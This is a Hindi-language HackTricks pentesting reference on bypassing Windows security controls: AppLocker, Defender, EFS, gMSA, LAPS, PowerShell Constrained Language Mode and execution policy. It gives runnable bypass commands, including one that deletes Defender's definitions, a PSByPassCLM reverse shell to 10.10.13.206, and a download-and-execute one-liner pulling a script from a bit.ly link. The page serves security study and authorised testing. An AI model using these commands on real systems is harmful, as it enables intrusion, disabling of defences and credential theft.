# Windows सुरक्षा नियंत्रण

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** का अनुसरण करें.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) का उपयोग करके दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित **वर्कफ्लो को आसानी से बनाएं और स्वचालित करें**।\
आज ही एक्सेस प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker नीति

एप्लिकेशन व्हाइटलिस्ट एक प्रकार की सूची होती है जिसमें अनुमोदित सॉफ्टवेयर एप्लिकेशन या एक्जीक्यूटेबल्स होते हैं जिन्हें सिस्टम पर मौजूद होने और चलाने की अनुमति होती है। इसका उद्देश्य हानिकारक मैलवेयर और अनुमोदित नहीं किए गए सॉफ्टवेयर से पर्यावरण की रक्षा करना है जो संगठन की विशिष्ट व्यावसायिक जरूरतों के अनुरूप नहीं है।

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft का **एप्लिकेशन व्हाइटलिस्टिंग समाधान** है और यह सिस्टम प्रशासकों को नियंत्रण प्रदान करता है **कि उपयोगकर्ता कौन से एप्लिकेशन और फाइलें चला सकते हैं**। यह एक्जीक्यूटेबल्स, स्क्रिप्ट्स, Windows इंस्टॉलर फाइल्स, DLLs, पैकेज्ड एप्स, और पैक्ड एप इंस्टॉलर्स पर **विस्तृत नियंत्रण** प्रदान करता है।\
यह आम है कि संगठन **cmd.exe और PowerShell.exe को ब्लॉक करते हैं** और कुछ डायरेक्टरीज में लिखने की अनुमति नहीं देते हैं, **लेकिन यह सब बाईपास किया जा सकता है**।

### जांच

जांचें कि कौन सी फाइलें/एक्सटेंशन ब्लैकलिस्टेड/व्हाइटलिस्टेड हैं:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
### बायपास

* AppLocker नीति को बायपास करने के लिए उपयोगी **लिखने योग्य फ़ोल्डर**: यदि AppLocker `C:\Windows\System32` या `C:\Windows` के अंदर कुछ भी निष्पादित करने की अनुमति दे रहा है, तो वहाँ **लिखने योग्य फ़ोल्डर** हैं जिनका उपयोग आप **इसे बायपास करने** के लिए कर सकते हैं।
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* आमतौर पर **विश्वसनीय** [**"LOLBAS's"**](https://lolbas-project.github.io/) बाइनरीज़ भी AppLocker को बायपास करने के लिए उपयोगी हो सकती हैं।
* **खराब लिखे गए नियमों को भी बायपास किया जा सकता है**
* उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, आप कहीं भी **`allowed` नामक फोल्डर बना सकते हैं** और यह अनुमति दी जाएगी।
* संगठन अक्सर **`%System32%\WindowsPowerShell\v1.0\powershell.exe` एक्जीक्यूटेबल को ब्लॉक करने पर ध्यान केंद्रित करते हैं**, लेकिन अन्य [**PowerShell एक्जीक्यूटेबल स्थानों**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) जैसे `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe` के बारे में भूल जाते हैं।
* **DLL प्रवर्तन बहुत कम सक्षम किया जाता है** क्योंकि यह एक सिस्टम पर अतिरिक्त भार डाल सकता है, और यह सुनिश्चित करने के लिए कि कुछ भी टूटेगा नहीं, इसके लिए बहुत सारी परीक्षण की आवश्यकता होती है। इसलिए **DLLs का उपयोग बैकडोर के रूप में करने से AppLocker को बायपास करने में मदद मिलेगी**।
* आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग करके किसी भी प्रक्रिया में **Powershell** कोड को **निष्पादित कर सकते हैं** और AppLocker को बायपास कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)।

## प्रमाणीकरण संग्रहण

### सुरक्षा खाते प्रबंधक (SAM)

स्थानीय प्रमाणीकरण इस फाइल में मौजूद हैं, पासवर्ड हैश किए गए हैं।

### स्थानीय सुरक्षा प्राधिकरण (LSA) - LSASS

**प्रमाणीकरण** (हैश) इस उपप्रणाली की **मेमोरी** में **सहेजे गए** हैं एकल साइन-ऑन कारणों के लिए।\
**LSA** स्थानीय **सुरक्षा नीति** (पासवर्ड नीति, उपयोगकर्ता अनुमतियाँ...), **प्रमाणीकरण**, **एक्सेस टोकन**... का प्रबंधन करता है।\
LSA वह होगा जो **SAM** फाइल के अंदर प्रदान किए गए प्रमाणीकरण की **जांच** करेगा (स्थानीय लॉगिन के लिए) और डोमेन उपयोगकर्ता को प्रमाणित करने के लिए **डोमेन कंट्रोलर** से **बात** करेगा।

**प्रमाणीकरण** **प्रक्रिया LSASS** के अंदर **सहेजे गए** हैं: Kerberos टिकट, हैश NT और LM, आसानी से डिक्रिप्ट किए गए पासवर्ड।

### LSA सीक्रेट्स

LSA कुछ प्रमाणीकरण को डिस्क में सहेज सकता है:

* एक्टिव डायरेक्टरी के कंप्यूटर खाते का पासवर्ड (पहुँच से बाहर डोमेन कंट्रोलर)।
* विंडोज सेवाओं के खातों के पासवर्ड
* निर्धारित कार्यों के लिए पासवर्ड
* और अधिक (IIS अनुप्रयोगों का पासवर्ड...)

### NTDS.dit

यह एक्टिव डायरेक्टरी का डेटाबेस है। यह केवल डोमेन कंट्रोलर्स में मौजूद है।

## डिफेंडर

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) \*\*\*\* एक एंटीवायरस है जो Windows 10 और Windows 11 में, और Windows Server के संस्करणों में उपलब्ध है। यह **`WinPEAS`** जैसे सामान्य पेंटेस्टिंग टूल्स को **ब्लॉक** करता है। हालांकि, इन सुरक्षाओं को **बायपास करने के तरीके** हैं।

### जांच

**Defender** की **स्थिति** की जांच करने के लिए आप PS cmdlet **`Get-MpComputerStatus`** को निष्पादित कर सकते हैं (यह जानने के लिए कि यह सक्रिय है या नहीं, **`RealTimeProtectionEnabled`** के मान की जांच करें):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

इसे सूचीबद्ध करने के लिए आप यह भी चला सकते हैं:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (एन्क्रिप्टेड फाइल सिस्टम)

EFS एक फाइल को एक **सममित कुंजी** से एन्क्रिप्ट करके काम करता है, जिसे फाइल एन्क्रिप्शन की, या **FEK** के नाम से जाना जाता है। FEK को फिर उस **सार्वजनिक कुंजी** से **एन्क्रिप्ट** किया जाता है जो उस उपयोगकर्ता से जुड़ी होती है जिसने फाइल को एन्क्रिप्ट किया है, और यह एन्क्रिप्टेड FEK को $EFS **वैकल्पिक डेटा स्ट्रीम** में संग्रहीत किया जाता है। फाइल को डिक्रिप्ट करने के लिए, EFS कंपोनेंट ड्राइवर $EFS स्ट्रीम में संग्रहीत सममित कुंजी को डिक्रिप्ट करने के लिए EFS डिजिटल प्रमाणपत्र (जिसका उपयोग फाइल को एन्क्रिप्ट करने के लिए किया गया था) से मेल खाने वाली **निजी कुंजी** का उपयोग करता है। [यहाँ](https://en.wikipedia.org/wiki/Encrypting_File_System) से।

उदाहरण जब फाइलें बिना उपयोगकर्ता के अनुरोध के डिक्रिप्ट हो जाती हैं:

* फाइलें और फोल्डर्स को [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) जैसे अन्य फाइल सिस्टम के साथ फॉर्मेट किए गए वॉल्यूम में कॉपी करने से पहले डिक्रिप्ट किया जाता है।
* एन्क्रिप्टेड फाइलें जब SMB/CIFS प्रोटोकॉल का उपयोग करके नेटवर्क पर कॉपी की जाती हैं, तो फाइलें नेटवर्क पर भेजे जाने से पहले डिक्रिप्ट की जाती हैं।

इस विधि से एन्क्रिप्टेड फाइलों को **मालिक उपयोगकर्ता द्वारा पारदर्शी रूप से एक्सेस किया जा सकता है** (जिसने उन्हें एन्क्रिप्ट किया है), इसलिए अगर आप **उस उपयोगकर्ता बन सकते हैं** तो आप फाइलों को डिक्रिप्ट कर सकते हैं (उपयोगकर्ता का पासवर्ड बदलना और उसके रूप में लॉगिन करना काम नहीं करेगा)।

### EFS जानकारी जांचें

यह जांचें कि क्या कोई **उपयोगकर्ता** ने इस **सेवा** का **उपयोग किया** है यह पथ मौजूद है या नहीं: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

जांचें **किसके पास** फाइल तक **पहुंच** है cipher /c \<file>\
आप `cipher /e` और `cipher /d` का उपयोग भी एक फोल्डर के अंदर सभी फाइलों को **एन्क्रिप्ट** और **डिक्रिप्ट** करने के लिए कर सकते हैं।

### EFS फाइलों को डिक्रिप्ट करना

#### अधिकार प्रणाली होना

इस तरीके की आवश्यकता है कि **पीड़ित उपयोगकर्ता** होस्ट के अंदर एक **प्रक्रिया** **चला** रहा हो। अगर ऐसा है, तो `meterpreter` सत्र का उपयोग करके आप उपयोगकर्ता की प्रक्रिया के टोकन की नकल कर सकते हैं (`impersonate_token` `incognito` से)। या आप सिर्फ उपयोगकर्ता की प्रक्रिया में `migrate` कर सकते हैं।

#### उपयोगकर्ता का पासवर्ड जानना

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

अधिकांश इंफ्रास्ट्रक्चर में, सेवा खाते सामान्य उपयोगकर्ता खाते होते हैं जिनमें “**पासवर्ड कभी समाप्त नहीं होता**” विकल्प होता है। इन खातों का प्रबंधन एक वास्तविक समस्या हो सकती है और इसीलिए Microsoft ने **Managed Service Accounts** पेश किए:

* अब पासवर्ड प्रबंधन की जरूरत नहीं है। यह एक जटिल, यादृच्छिक, 240-अक्षर का पासवर्ड का उपयोग करता है और जब डोमेन या कंप्यूटर पासवर्ड समाप्ति तिथि तक पहुंचता है तो उसे स्वचालित रूप से बदल देता है।
* यह Microsoft Key Distribution Service (KDC) का उपयोग करके gMSA के लिए पासवर्ड बनाने और प्रबंधित करने के लिए करता है।
* इसे लॉक आउट नहीं किया जा सकता या इंटरएक्टिव लॉगिन के लिए उपयोग नहीं किया जा सकता
* कई होस्टों के बीच साझा करने का समर्थन करता है
* शेड्यूल किए गए कार्यों को चलाने के लिए उपयोग किया जा सकता है (Managed service accounts शेड्यूल किए गए कार्यों को चलाने का समर्थन नहीं करते)
* सरलीकृत SPN प्रबंधन – सिस्टम स्वचालित रूप से SPN मान को बदल देगा अगर कंप्यूटर के **sAMaccount** विवरण या DNS नाम संपत्ति बदल जाती है।

gMSA खातों के पासवर्ड _**msDS-ManagedPassword**_ नामक LDAP प्रॉपर्टी में संग्रहीत होते हैं जो DC’s द्वारा हर 30 दिनों में **स्वचालित रूप से रीसेट** हो जाते हैं, **अधिकृत प्रशासकों** और उन सर्वरों द्वारा **प्राप्त किए जा सकते हैं** जिन पर वे स्थापित हैं। _**msDS-ManagedPassword**_ एक एन्क्रिप्टेड डेटा ब्लॉब है जिसे [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) कहा जाता है और यह केवल तभी प्राप्त किया जा सकता है जब कनेक्शन सुरक्षित हो, **LDAPS** या जब प्रमाणीकरण प्रकार 'Sealing & Secure' हो, उदाहरण के लिए।

![Image from https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

तो, अगर gMSA का उपयोग किया जा रहा है, तो जांचें कि क्या इसमें **विशेष अधिकार** हैं और यह भी जांचें कि क्या आपके पास सेवाओं के पासवर्ड को **पढ़ने** की **अनुमति** है।

आप इस पासवर्ड को [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader) के साथ पढ़ सकते हैं:
```
/GMSAPasswordReader --AccountName jkohler
```
इस [वेब पेज](https://cube0x0.github.io/Relaying-for-gMSA/) को भी देखें जो बताता है कि कैसे **NTLM relay attack** का प्रयोग करके **gMSA** का **पासवर्ड** **पढ़ा** जा सकता है।

## LAPS

[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) आपको डोमेन-जुड़े कंप्यूटरों पर स्थानीय एडमिनिस्ट्रेटर का पासवर्ड (**यादृच्छिक**, अद्वितीय और नियमित रूप से **बदला जाने वाला**) **प्रबंधित करने** की अनुमति देता है। ये पासवर्ड केंद्रीय रूप से Active Directory में संग्रहीत किए जाते हैं और ACLs का उपयोग करके अधिकृत उपयोगकर्ताओं तक सीमित होते हैं। यदि आपके उपयोगकर्ता को पर्याप्त अनुमतियां दी गई हैं तो आप स्थानीय एडमिन्स के पासवर्ड पढ़ सकते हैं।

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) कई ऐसी सुविधाओं को **सीमित कर देता है** जो PowerShell का प्रभावी ढंग से उपयोग करने के लिए आवश्यक हैं, जैसे कि COM ऑब्जेक्ट्स को ब्लॉक करना, केवल अनुमोदित .NET प्रकारों की अनुमति देना, XAML-आधारित वर्कफ्लोज़, PowerShell क्लासेस, और अधिक।

### **जांचें**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### बायपास
```powershell
#Easy bypass
Powershell -version 2
```
वर्तमान Windows में वह Bypass काम नहीं करेगा लेकिन आप [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) का उपयोग कर सकते हैं।\
**इसे कंपाइल करने के लिए आपको जरूरत पड़ सकती है** _**संदर्भ जोड़ें**_ -> _ब्राउज़ करें_ -> _ब्राउज़ करें_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` जोड़ें और **प्रोजेक्ट को .Net4.5 में बदलें**।

#### सीधा बायपास:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### रिवर्स शेल:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग करके किसी भी प्रक्रिया में **Powershell** कोड को निष्पादित कर सकते हैं और संयमित मोड को बायपास कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS निष्पादन नीति

डिफ़ॉल्ट रूप से यह **प्रतिबंधित** पर सेट होती है। इस नीति को बायपास करने के मुख्य तरीके:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
और जानकारी [यहाँ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) पाई जा सकती है।

## सिक्योरिटी सपोर्ट प्रोवाइडर इंटरफेस (SSPI)

यह एक API है जिसका उपयोग उपयोगकर्ताओं को प्रमाणित करने के लिए किया जा सकता है।

SSPI दो मशीनों के बीच संवाद करने के लिए उपयुक्त प्रोटोकॉल खोजने का काम करेगा। इसके लिए पसंदीदा विधि Kerberos है। फिर SSPI यह तय करेगा कि कौन सा प्रमाणीकरण प्रोटोकॉल इस्तेमाल किया जाएगा, इन प्रमाणीकरण प्रोटोकॉलों को सिक्योरिटी सपोर्ट प्रोवाइडर (SSP) कहा जाता है, ये प्रत्येक Windows मशीन के अंदर DLL के रूप में स्थित होते हैं और दोनों मशीनों को संवाद करने के लिए एक ही SSP का समर्थन करना चाहिए।

### मुख्य SSPs

* **Kerberos**: पसंदीदा विधि
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** और **NTLMv2**: संगतता के लिए
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: वेब सर्वर और LDAP, पासवर्ड MD5 हैश के रूप में
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL और TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: इसका उपयोग प्रोटोकॉल (Kerberos या NTLM, Kerberos डिफ़ॉल्ट होने के नाते) को तय करने के लिए किया जाता है
* %windir%\Windows\System32\lsasrv.dll

#### बातचीत में कई विधियाँ या केवल एक ही पेश की जा सकती है।

## UAC - यूजर अकाउंट कंट्रोल

[यूजर अकाउंट कंट्रोल (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक ऐसी सुविधा है जो **उच्च स्तरीय गतिविधियों के लिए सहमति प्रॉम्प्ट** सक्षम करती है।

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करके आसानी से **वर्कफ्लोज़ का निर्माण और ऑटोमेशन** करें, जो दुनिया के **सबसे उन्नत** समुदाय टूल्स द्वारा संचालित होते हैं।\
आज ही पहुँच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) या [**telegram group**](https://t.me/peass) में **शामिल हों** या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
